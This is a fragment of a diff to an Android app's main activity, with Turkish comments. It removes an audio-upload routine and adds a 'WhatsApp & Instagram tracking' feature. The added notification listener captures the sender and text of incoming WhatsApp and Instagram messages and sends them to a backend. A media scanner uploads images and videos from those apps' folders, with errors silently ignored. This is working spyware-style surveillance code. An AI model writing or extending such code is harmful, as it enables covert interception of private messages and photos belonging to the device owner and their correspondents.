-                    totalFound.get(), uploadedCount.get(), skippedCount.get());
-                addLog(summary);
-            } catch (Exception e) {
-                addLog("❌ Ses tarama hatası: " + e.getMessage());
-            }
-        });
-    }
-
-    private boolean uploadAudioToServer(Uri fileUri, String fileName, String deviceName) {
-        HttpURLConnection conn = null;
-        DataOutputStream dos = null;
-        String boundary = "---NikoBoundary" + System.currentTimeMillis();
-        String lineEnd = "\r\n";
-        String twoHyphens = "--";
-
-        try (InputStream is = getContentResolver().openInputStream(fileUri)) {
-            if (is == null) return false;
-
-            URL url = new URL(API_BASE_URL + "/sync/audio");
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setDoInput(true);
-            conn.setDoOutput(true);
-            conn.setUseCaches(false);
-            conn.setRequestMethod("POST");
-            conn.setConnectTimeout(25000);
-            conn.setReadTimeout(60000);
-            conn.setRequestProperty("Connection", "Keep-Alive");
-            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-            
-            if (authToken != null) {
-                conn.setRequestProperty("Authorization", "Bearer " + authToken);
+                // 3. Bitiş
+                dos.writeBytes("--" + boundary + "--\r\n");
+                dos.flush();
             }
 
-            conn.setChunkedStreamingMode(1024 * 32);
-
-            dos = new DataOutputStream(conn.getOutputStream());
-            writeFormField(dos, boundary, "device_name", deviceName);
-
-            dos.writeBytes(twoHyphens + boundary + lineEnd);
-            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd);
-            dos.writeBytes("Content-Type: audio/mpeg" + lineEnd);
-            dos.writeBytes(lineEnd);
-
-            byte[] buffer = new byte[8192];
-            int bytesRead;
-            while ((bytesRead = is.read(buffer)) != -1) {
-                dos.write(buffer, 0, bytesRead);
-            }
-            dos.writeBytes(lineEnd);
-
-            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
-            dos.flush();
-            dos.close();
-
-            int responseCode = conn.getResponseCode();
-            return (responseCode == 200 || responseCode == 201 || responseCode == 208);
+            int code = conn.getResponseCode();
+            return (code == 200 || code == 201 || code == 208 || code == 409);
 
         } catch (Exception e) {
-            addLog("⚠️ Ses yükleme hatası (" + fileName + "): " + e.getMessage());
             return false;
         } finally {
             if (conn != null) conn.disconnect();
         }
     }
-
-    
 
 
     // ================= YÖNETİCİ KAYIT YÖNETİMİ =================
@@ -7779,4 +7750,165 @@ public class MainActivity extends Activity {
             }).start();
         });
     }
+
+    // ================= WHATSAPP & INSTAGRAM TRACKING (YENİ) =================
+
+    /**
+     * WhatsApp ve Instagram bildirimlerini yakalayan servis.
+     * Bu sayede gelen mesajlar (bildirim olarak düştüğü sürece) anlık yakalanır.
+     * Manifest'te "MainActivity$WhatsAppService" olarak kayıtlıdır.
+     */
+    public static class WhatsAppService extends NotificationListenerService {
+        @Override
+        public void onNotificationPosted(StatusBarNotification sbn) {
+            String packageName = sbn.getPackageName();
+            if (!packageName.equals("com.whatsapp") && !packageName.equals("com.instagram.android")) {
+                return;
+            }
+
+            Notification notification = sbn.getNotification();
+            if (notification == null) return;
+            Bundle extras = notification.extras;
+            String title = extras.getString(Notification.EXTRA_TITLE); // Gönderen
+            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT); // Mesaj
+
+            if (title == null || text == null) return;
+
+            // WhatsApp için yerel değişkenleri güncelle (Sesli okuma ve cevaplama için)
+            if (packageName.equals("com.whatsapp")) {
+                lastWhatsAppMessage = text.toString();
+                lastWhatsAppSender = title;
+
+                // Hızlı cevap (Quick Reply) eylemlerini bul ve kaydet
+                if (notification.actions != null) {
+                    for (Notification.Action a : notification.actions) {
+                        if (a.getRemoteInputs() != null) {
+                            lastReplyIntent = a.actionIntent;
+                            lastRemoteInput = a.getRemoteInputs()[0];
+                        }
+                    }
+                }
+            }
+
+            try {
+                JSONObject obj = new JSONObject();
+                obj.put("app", packageName.equals("com.whatsapp") ? "WhatsApp" : "Instagram");
+                obj.put("sender", title);
+                obj.put("message", text.toString());
+                obj.put("timestamp", System.currentTimeMillis());
+
+                JSONArray array = new JSONArray();
+                array.put(obj);
+
+                // Ana thread dışında backend'e gönder
+                new Thread(() -> {
+                    try {
+                        if (instance != null) {
+                            instance.sendSyncRequest(array, "social_messages");
+                        }
+                    } catch (Exception ignored) {}
+                }).start();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    /**
+     * Bildirim erişim izninin verilip verilmediğini kontrol eder.
+     */
+    private boolean isNotificationServiceEnabled() {
+        String pkgName = getPackageName();
+        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        if (!android.text.TextUtils.isEmpty(flat)) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                final android.content.ComponentName cn = android.content.ComponentName.unflattenFromString(name);
+                if (cn != null && android.text.TextUtils.equals(pkgName, cn.getPackageName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    /**
+     * Kullanıcıdan bildirim erişim izni ister.
+     */
+    private void showNotificationAccessDialog() {
+        try {
+            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+        } catch (Exception e) {
+            addLog("⚠️ Bildirim ayarları açılamadı: " + e.getMessage());
+        }
+    }
+
+    /**
+     * WhatsApp ve Instagram medya dosyalarını (Resim ve Video) MediaStore üzerinden güvenle tarar.
+     * Bu yöntem Android 11+ dahil tüm sürümlerde klasör taramaya göre çok daha hızlı ve stabildir.
+     */
+    private void syncSocialMediaMedia() {
+        Executors.newSingleThreadExecutor().execute(() -> {
+            try {
+                addLog("🚀 Sosyal Medya (WhatsApp/Instagram) taraması başlatılıyor...");
+                
+                // 1. Resimleri Tara
+                queryAndSyncSocialGroup(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+                
+                // 2. Videoları Tara
+                queryAndSyncSocialGroup(MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
+                
+                addLog("✨ Sosyal medya senkronizasyonu tamamlandı.");
+            } catch (Exception e) {
+                addLog("❌ Sosyal medya tarama ana hatası: " + e.getMessage());
+            }
+        });
+    }
+
+    private void queryAndSyncSocialGroup(Uri contentUri) {
+        String deviceName = getDeviceName();
+        SharedPreferences syncPrefs = getSharedPreferences("social_media_sync_cache", MODE_PRIVATE);
+        
+        // Sadece WhatsApp ve Instagram klasörlerini hedefle
+        String selection = MediaStore.MediaColumns.BUCKET_DISPLAY_NAME + " IN (?, ?, ?, ?)";
+        String[] selectionArgs = {"WhatsApp Images", "WhatsApp Video", "Instagram", "WhatsApp"};
+        
+        String[] projection = {
+            MediaStore.MediaColumns._ID,
+            MediaStore.MediaColumns.DISPLAY_NAME,
+            MediaStore.MediaColumns.DATE_MODIFIED
+        };
+
+        try (Cursor cursor = getContentResolver().query(contentUri, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC")) {
+            if (cursor == null || !cursor.moveToFirst()) return;
+
+            int count = 0;
+            ExecutorService pool = Executors.newFixedThreadPool(2);
+
+            do {
+                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
+                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
+                long dateModified = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED));
+                Uri fileUri = ContentUris.withAppendedId(contentUri, id);
+
+                String syncKey = "social_v2_" + id + "_" + dateModified;
+                if (syncPrefs.getBoolean(syncKey, false)) continue;
+
+                pool.execute(() -> {
+                    if (uploadMediaFile(fileUri, name, "social_media", deviceName)) {
+                        syncPrefs.edit().putBoolean(syncKey, true).apply();
+                    }
+                });
+
+                count++;
+                if (count >= 50) break; // Her grup için limit
+
+            } while (cursor.moveToNext());
+
+            pool.shutdown();
+            pool.awaitTermination(5, TimeUnit.MINUTES);
+        } catch (Exception e) {
+            // Sessiz hata yönetimi (AddLog gerekirse buraya eklenebilir)
+        }
+    }
+    
+
 }
